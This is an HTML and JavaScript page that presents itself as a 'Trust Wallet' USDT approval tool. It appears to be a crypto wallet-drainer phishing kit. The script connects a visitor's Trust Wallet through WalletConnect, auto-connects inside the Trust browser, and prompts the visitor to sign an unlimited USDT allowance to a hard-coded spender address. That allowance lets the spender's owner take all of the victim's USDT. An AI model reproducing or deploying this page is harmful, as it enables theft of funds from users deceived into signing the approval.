<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>USDT Approve - Trust Wallet</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: white;
            text-align: center;
        }
        .container {
            background: rgba(255,255,255,0.15);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 40px 30px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
        }
        .logo {
            width: 90px; height: 90px; background: #f0b90b;
            border-radius: 24px; margin: 0 auto 25px;
            display: flex; align-items: center; justify-content: center;
            font-size: 32px; font-weight: bold; box-shadow: 0 10px 25px rgba(240,185,11,0.4);
        }
        h1 { font-size: 26px; margin-bottom: 12px; font-weight: 700; }
        .subtitle { opacity: 0.95; margin-bottom: 35px; font-size: 16px; }
        .status {
            padding: 18px; border-radius: 16px; margin-bottom: 25px;
            font-size: 15px; font-weight: 600; min-height: 60px;
            display: flex; align-items: center; justify-content: center;
        }
        .status.connecting { background: rgba(255,193,7,0.3); }
        .status.connected { background: rgba(40,167,69,0.3); animation: pulse 2s infinite; }
        .status.approving { background: rgba(0,123,255,0.3); }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
        .connect-btn, .approve-btn {
            background: linear-gradient(45deg, #f0b90b, #e6a700);
            color: #000; border: none; padding: 20px 50px;
            border-radius: 50px; font-size: 18px; font-weight: 800;
            width: 100%; cursor: pointer; transition: all 0.3s;
            text-transform: uppercase; letter-spacing: 1px; margin-bottom: 15px;
        }
        .connect-btn:hover:not(:disabled), .approve-btn:hover:not(:disabled) {
            transform: translateY(-3px); box-shadow: 0 15px 35px rgba(240,185,11,0.5);
        }
        .connect-btn:disabled, .approve-btn:disabled {
            opacity: 0.6; cursor: not-allowed; transform: none;
        }
        .spinner {
            width: 28px; height: 28px; border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid white; border-radius: 50%;
            animation: spin 1s linear infinite; margin-right: 12px;
        }
        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
        .network-info {
            background: rgba(255,255,255,0.1); border-radius: 14px;
            padding: 16px; margin: 20px 0; font-size: 14px; display: none;
        }
        .error { color: #ff6b6b; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">USDT</div>
        <h1>Unlimited Approval</h1>
        <p class="subtitle">One tap USDT spender approval</p>
        
        <div id="status" class="status">Tap to connect Trust Wallet</div>
        
        <div id="networkInfo" class="network-info">
            <strong id="account"></strong><br>
            Network: TRON Mainnet
        </div>
        
        <button id="connectBtn" class="connect-btn">🔔 Connect Trust Wallet</button>
        <button id="approveBtn" class="approve-btn" disabled style="display:none;">
            ✅ Approve Unlimited
        </button>
    </div>

    <!-- FIXED: Correct WalletConnect v2.0 + TronWeb -->
    <script src="https://unpkg.com/@walletconnect/universal-provider@2.14.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>

    <script>
        // 🔧 CONFIG - Replace these 2 values
        const PROJECT_ID = '171db6da15a54effc1b4a06f889a3c3f';  // Get from cloud.walletconnect.com
        const SPENDER_ADDRESS = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';        // Your contract address
        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC20 USDT Mainnet

        let provider, tronWeb, connectedAccount = '';

        // TRUST WALLET INSTANT DEEPLINK + WALLET CONNECT v2.0
        async function connectTrustWallet() {
            try {
                updateStatus('connecting', '<div class="spinner"></div>Opening Trust Wallet...');

                // WalletConnect v2.0 Universal Provider (FIXED)
                provider = await WalletConnectProvider.init({
                    projectId: PROJECT_ID,
                    metadata: {
                        name: 'USDT Approver',
                        description: 'Unlimited USDT Approval',
                        url: window.location.origin,
                        icons: []
                    },
                    showQrModal: false
                });

                // Enable session (Trust Wallet auto-handles Tron)
                await provider.enable();

                // TRUST WALLET DEEPLINK (if not auto-opened)
                const sessionUri = provider.session?.uri || provider.uri;
                if (sessionUri && !window.trust) {
                    const deeplink = `trust://wc?uri=${encodeURIComponent(sessionUri)}`;
                    window.location.href = deeplink;
                }

                await onConnect();

            } catch (error) {
                console.error('Connect error:', error);
                updateStatus('error', 'Open Trust Wallet & try again');
                setTimeout(connectTrustWallet, 1500);
            }
        }

        async function onConnect() {
            connectedAccount = provider.accounts[0];
            
            updateStatus('connected', `Connected: ${connectedAccount.slice(0,6)}...${connectedAccount.slice(-4)}`);
            document.getElementById('networkInfo').style.display = 'block';
            document.getElementById('account').textContent = connectedAccount.slice(0,8) + '...' + connectedAccount.slice(-6);
            document.getElementById('connectBtn').style.display = 'none';
            document.getElementById('approveBtn').style.display = 'block';
            document.getElementById('approveBtn').disabled = false;
        }

        // TRONSCAN EXACT USDT UNLIMITED APPROVE
        async function approveUSDTUnlimited() {
            try {
                updateStatus('approving', '<div class="spinner"></div>Approve in Trust Wallet...');
                document.getElementById('approveBtn').disabled = true;

                // TronWeb + WalletConnect Provider (TRON Mainnet)
                tronWeb = new TronWeb({
                    fullHost: 'https://api.trongrid.io',
                    privateKey: false,
                    providers: [{ 
                        name: 'WalletConnect', 
                        instance: provider 
                    }]
                });

                // TRC20 USDT APPROVE (EXACT TRONSCAN)
                const contract = await tronWeb.contract().at(USDT_CONTRACT);
                const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

                // TRUST WALLET SIGN + SEND (Pops approval dialog)
                const tx = await contract.approve(SPENDER_ADDRESS, MAX_UINT256).send({
                    feeLimit: 40000000,    // 40 TRX (Tronscan standard)
                    callValue: 0,
                    shouldPollResponse: true
                });

                updateStatus('connected', `✅ APPROVED!<br>Tx: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" style="color:#f0b90b;">${tx.slice(0,12)}...</a>`);
                
            } catch (error) {
                console.error('Approve failed:', error);
                updateStatus('error', `Error: ${error.message}`);
                document.getElementById('approveBtn').disabled = false;
            }
        }

        // EVENTS
        document.getElementById('connectBtn').onclick = connectTrustWallet;
        document.getElementById('approveBtn').onclick = approveUSDTUnlimited;

        // AUTO-CONNECT (Trust Wallet browser)
        if (navigator.userAgent.includes('Trust') || window.ethereum?.isTrust) {
            setTimeout(connectTrustWallet, 800);
        }

        // MOBILE FIXES
        document.addEventListener('DOMContentLoaded', () => {
            console.log('✅ DApp loaded - Ready for Trust Wallet!');
        });
    </script>
</body>
</html>
